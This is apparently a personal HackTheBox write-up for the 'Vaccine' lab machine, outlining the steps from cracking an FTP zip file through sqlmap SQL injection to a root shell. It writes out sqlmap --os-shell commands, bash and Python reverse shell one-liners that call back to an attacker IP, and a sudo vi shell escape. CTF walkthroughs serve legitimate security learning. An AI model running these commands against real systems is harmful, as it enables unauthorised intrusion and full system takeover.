---
title: Vaccine ~ SQLi
date: 2025-12-24 00:00:00 +0000
categories: [HackTheBox Writeups, Windows]
tags: [hackthebox, windows]
---


login page > ftp has a zip file > grep .php admin hash password > zip2john > crack with rockyou.txt > login > search query in panel > search= parameter in url > sqlmap > shell > upgrade from sqlmap os-shell to bash > insert payload in os-shell session >  password for user from dashboard.php >  sudo -l > /bin/vi has root permissions >  we connect via ssh for stable shell > edit with vi command line /bin/vi > we get root > flag.

 --url
http://10.129.139.173/dashboard.php?search=dasdsa  
search= means it uses a db most likely


```
sqlmap -u 'http://10.129.139.173/dashboard.php?search=any+query' --cookie="PHPSESSID=sisg1ttssvvugq3k9esm71pj3f"  
```

```
bash -c "bash -i >& /dev/tcp/10.10.15.73/443 0>&1"
```

```
 > python3 -c "import os,pty,socket;s=socket.socket();s.connect((\"YOUR_IP\",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")"
```
 
 Good command:
```
 sqlmap -u 'http://10.129.80.191/dashboard.php?search=any+query' --cookie="PHPSESSID=d6gsn6dg4vksjq3vebgnep8p01" --os-shell
```

Next payload to make it interactive:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
```

> sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf

We enter in vi, we press : to enter command line.
**`set shell=/bin/sh`**  enter, press : again, type shell, enter, we have root


